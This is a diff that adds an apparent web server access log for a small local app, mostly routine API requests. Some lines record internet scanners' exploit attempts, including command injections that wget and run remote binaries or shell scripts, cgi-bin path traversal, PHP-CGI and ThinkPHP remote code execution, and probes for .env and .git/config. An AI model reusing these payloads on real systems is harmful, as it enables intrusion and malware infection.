@@ -1,0 +1,399 @@
+[2025. 11. 15. 오전 9:45:29] [SYSTEM] 🚀 Running at http://localhost:2000
+[2025. 11. 15. 오전 9:45:38] [REQ] ::ffff:192.168.219.1 GET /favicon.ico
+[2025. 11. 15. 오전 9:45:49] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오전 9:46:08] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오전 9:48:45] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 9:49:32] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 9:49:49] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 9:49:54] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 9:49:56] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 9:50:04] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 9:50:13] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 9:50:15] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 9:50:39] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오전 9:54:59] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 10:11:05] [SYSTEM] 🚀 Running at http://localhost:2000
+[2025. 11. 15. 오전 10:11:26] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 10:33:45] [REQ] ::ffff:172.202.118.82 GET /manager/text/list
+[2025. 11. 15. 오전 10:54:28] [REQ] ::ffff:192.168.219.1 GET /favicon.ico
+[2025. 11. 15. 오전 10:54:36] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 10:54:43] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 10:57:43] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:07:52] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:08:27] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:10:03] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:14:08] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:15:05] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:15:18] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:15:25] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:15:27] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:15:29] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:15:31] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:15:32] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:15:32] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:26:46] [SYSTEM] 🚀 Running at http://localhost:2000
+[2025. 11. 15. 오전 11:33:39] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:33:42] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:33:45] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:33:46] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:33:49] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:33:50] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:33:51] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:33:53] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:33:54] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:34:00] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:34:11] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:34:15] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:34:18] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:34:19] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:34:28] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:37:54] [SYSTEM] 🚀 Running at http://localhost:2000
+[2025. 11. 15. 오전 11:38:08] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:38:13] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:38:15] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:38:18] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:38:28] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:38:31] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:38:36] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:38:37] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:38:43] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:38:45] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:00] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:02] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:09] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:11] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:23] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:25] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:29] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:31] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:55] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:39:57] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:40:22] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:40:28] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:40:29] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:40:29] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:40:29] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:40:30] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:41:29] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:41:51] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오전 11:41:52] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:41:54] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:41:55] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오전 11:53:06] [REQ] ::ffff:20.65.195.48 GET /developmentserver/metadatauploader
+[2025. 11. 15. 오후 12:00:01] [SYSTEM] 🚀 Running at http://localhost:2000
+[2025. 11. 15. 오후 12:08:48] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 12:17:59] [REQ] ::ffff:64.225.8.2 POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20armv7l%3B%20wget%20http%3A%2F%2F209.200.252.33%2Farmv7l%3B%20chmod%20777%20%2A%3B%20.%2Farmv7l%20tbk
+[2025. 11. 15. 오후 12:22:16] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 12:22:21] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:22:22] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 12:23:57] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:24:01] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:24:14] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:24:28] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:24:30] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:24:43] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:24:47] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:02] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:05] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:08] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:09] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:12] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:26] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:28] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:32] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:34] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:36] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:45] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:47] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:49] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:25:55] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 12:26:46] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:26:47] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:26:49] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:26:51] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:26:53] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:26:56] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:26:58] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:06] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:09] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:14] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:16] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:24] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:27] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:29] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:31] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:33] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:36] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:50] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:27:52] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:01] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:03] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:04] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:08] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:09] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:17] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:20] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:24] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:28] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:32] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:39] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:28:41] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:30:17] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 12:30:46] [REQ] ::ffff:83.142.209.125 GET /login.rsp
+[2025. 11. 15. 오후 12:34:10] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 12:34:20] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 12:50:04] [REQ] ::ffff:170.64.143.165 GET /.env
+[2025. 11. 15. 오후 12:50:04] [REQ] ::ffff:170.64.143.165 GET /.git/config
+[2025. 11. 15. 오후 1:03:06] [REQ] ::ffff:211.36.152.160 GET /favicon.ico
+[2025. 11. 15. 오후 2:27:48] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 2:27:48] [REQ] ::ffff:192.168.219.1 GET /favicon.ico
+[2025. 11. 15. 오후 2:27:50] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 2:27:52] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 2:28:44] [REQ] ::ffff:192.168.219.1 POST /api/login-check
+[2025. 11. 15. 오후 2:28:48] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 2:31:30] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:31:51] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:31:55] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:31:57] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:31:59] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:32:01] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:32:05] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:32:08] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:32:09] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:32:11] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:32:18] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 2:32:31] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 2:33:40] [REQ] ::ffff:192.168.219.1 POST /api/update
+[2025. 11. 15. 오후 2:33:40] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 2:33:48] [REQ] ::ffff:192.168.219.1 POST /api/update
+[2025. 11. 15. 오후 2:33:48] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 2:33:57] [REQ] ::ffff:192.168.219.1 POST /api/update
+[2025. 11. 15. 오후 2:33:57] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 2:36:15] [REQ] ::ffff:192.168.219.1 POST /api/update
+[2025. 11. 15. 오후 2:36:15] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 2:36:20] [REQ] ::ffff:192.168.219.1 POST /api/update
+[2025. 11. 15. 오후 2:36:20] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 3:29:03] [REQ] ::ffff:94.102.49.206 GET /favicon.ico
+[2025. 11. 15. 오후 4:30:02] [REQ] ::ffff:192.168.219.1 GET /favicon.ico
+[2025. 11. 15. 오후 4:50:04] [REQ] ::ffff:185.250.37.224 POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
+[2025. 11. 15. 오후 4:50:06] [REQ] ::ffff:185.250.37.224 POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
+[2025. 11. 15. 오후 4:50:06] [REQ] ::ffff:185.250.37.224 POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+[2025. 11. 15. 오후 4:50:16] [REQ] ::ffff:185.250.37.224 POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+[2025. 11. 15. 오후 4:50:19] [REQ] ::ffff:185.250.37.224 GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:20] [REQ] ::ffff:185.250.37.224 GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:20] [REQ] ::ffff:185.250.37.224 GET /vendor/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:21] [REQ] ::ffff:185.250.37.224 GET /vendor/phpunit/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:21] [REQ] ::ffff:185.250.37.224 GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
+[2025. 11. 15. 오후 4:50:21] [REQ] ::ffff:185.250.37.224 GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:22] [REQ] ::ffff:185.250.37.224 GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:22] [REQ] ::ffff:185.250.37.224 GET /phpunit/phpunit/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:23] [REQ] ::ffff:185.250.37.224 GET /phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:23] [REQ] ::ffff:185.250.37.224 GET /phpunit/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:24] [REQ] ::ffff:185.250.37.224 GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:25] [REQ] ::ffff:185.250.37.224 GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:26] [REQ] ::ffff:185.250.37.224 GET /lib/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:27] [REQ] ::ffff:185.250.37.224 GET /lib/phpunit/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:29] [REQ] ::ffff:185.250.37.224 GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:30] [REQ] ::ffff:185.250.37.224 GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:31] [REQ] ::ffff:185.250.37.224 GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:32] [REQ] ::ffff:185.250.37.224 GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:33] [REQ] ::ffff:185.250.37.224 GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:34] [REQ] ::ffff:185.250.37.224 GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:34] [REQ] ::ffff:185.250.37.224 GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:35] [REQ] ::ffff:185.250.37.224 GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:37] [REQ] ::ffff:185.250.37.224 GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:37] [REQ] ::ffff:185.250.37.224 GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:38] [REQ] ::ffff:185.250.37.224 GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:38] [REQ] ::ffff:185.250.37.224 GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:39] [REQ] ::ffff:185.250.37.224 GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:39] [REQ] ::ffff:185.250.37.224 GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:40] [REQ] ::ffff:185.250.37.224 GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:41] [REQ] ::ffff:185.250.37.224 GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:42] [REQ] ::ffff:185.250.37.224 GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:42] [REQ] ::ffff:185.250.37.224 GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:43] [REQ] ::ffff:185.250.37.224 GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:44] [REQ] ::ffff:185.250.37.224 GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:45] [REQ] ::ffff:185.250.37.224 GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:46] [REQ] ::ffff:185.250.37.224 GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:47] [REQ] ::ffff:185.250.37.224 GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[2025. 11. 15. 오후 4:50:47] [REQ] ::ffff:185.250.37.224 GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
+[2025. 11. 15. 오후 4:50:48] [REQ] ::ffff:185.250.37.224 GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
+[2025. 11. 15. 오후 4:50:48] [REQ] ::ffff:185.250.37.224 GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+[2025. 11. 15. 오후 4:50:49] [REQ] ::ffff:185.250.37.224 GET /index.php?lang=../../../../../../../../tmp/index1
+[2025. 11. 15. 오후 4:50:49] [REQ] ::ffff:185.250.37.224 GET /containers/json
+[2025. 11. 15. 오후 5:49:33] [REQ] ::ffff:58.121.56.116 GET /favicon.ico
+[2025. 11. 15. 오후 5:49:37] [REQ] ::ffff:58.121.56.116 GET /api/user
+[2025. 11. 15. 오후 5:52:48] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 5:52:52] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 5:53:46] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 5:54:53] [SYSTEM] 🚀 Running at http://localhost:2000
+[2025. 11. 15. 오후 5:58:19] [REQ] ::ffff:64.31.56.53 GET /sql/sql.php?type=89A1FF33ABF0B55E&os=
+[2025. 11. 15. 오후 6:02:03] [SYSTEM] 🚀 Running at http://localhost:2000
+[2025. 11. 15. 오후 6:06:10] [SYSTEM] 🚀 Running at http://localhost:2000
+[2025. 11. 15. 오후 6:06:12] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 6:06:17] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:07:13] [REQ] ::ffff:203.24.77.45 GET /admin/sysadmin/index.php?lang=en
+[2025. 11. 15. 오후 6:07:27] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 6:07:30] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:18] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 6:08:20] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:31] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:33] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:33] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:36] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:37] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:38] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:39] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:40] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:47] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:48] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:52] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:53] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:59] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:08:59] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:09:18] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:09:20] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:09:22] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:09:24] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:09:30] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:09:31] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:09:32] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 6:16:22] [REQ] ::ffff:192.168.219.1 GET /icons/icon-192.png
+[2025. 11. 15. 오후 6:16:22] [REQ] ::ffff:192.168.219.1 GET /icons/icon-512.png
+[2025. 11. 15. 오후 6:16:22] [REQ] ::ffff:192.168.219.1 GET /icons/maskable-512.png
+[2025. 11. 15. 오후 6:30:50] [REQ] ::ffff:221.159.119.6 GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)
+[2025. 11. 15. 오후 6:30:50] [REQ] undefined GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)
+[2025. 11. 15. 오후 6:55:21] [REQ] ::ffff:83.142.209.125 GET /login.rsp
+[2025. 11. 15. 오후 7:30:48] [REQ] ::ffff:192.168.219.1 GET /favicon.ico
+[2025. 11. 15. 오후 7:30:52] [REQ] ::ffff:192.168.219.1 GET /api/ms
+[2025. 11. 15. 오후 7:30:52] [REQ] ::ffff:192.168.219.1 GET /icons/icon-192.png
+[2025. 11. 15. 오후 7:42:42] [REQ] ::ffff:192.168.219.1 POST /api/ms
+[2025. 11. 15. 오후 7:42:53] [REQ] ::ffff:192.168.219.1 GET /api/user
+[2025. 11. 15. 오후 7:50:36] [REQ] ::ffff:91.199.212.132 GET /.well-known/acme-challenge/n8nzz69rP0M-idzCWsr3-6zdgaHMxG-VicEyBXl7YTs
+[2025. 11. 15. 오후 7:50:52] [SYSTEM] 🚀 Running at http://localhost:2001
+[2025. 11. 15. 오후 7:52:33] [REQ] 192.168.219.1 GET /icons/icon-192.png
+[2025. 11. 15. 오후 7:52:33] [REQ] 192.168.219.1 GET /favicon.ico
+[2025. 11. 15. 오후 7:52:33] [REQ] 192.168.219.1 GET /icons/maskable-512.png
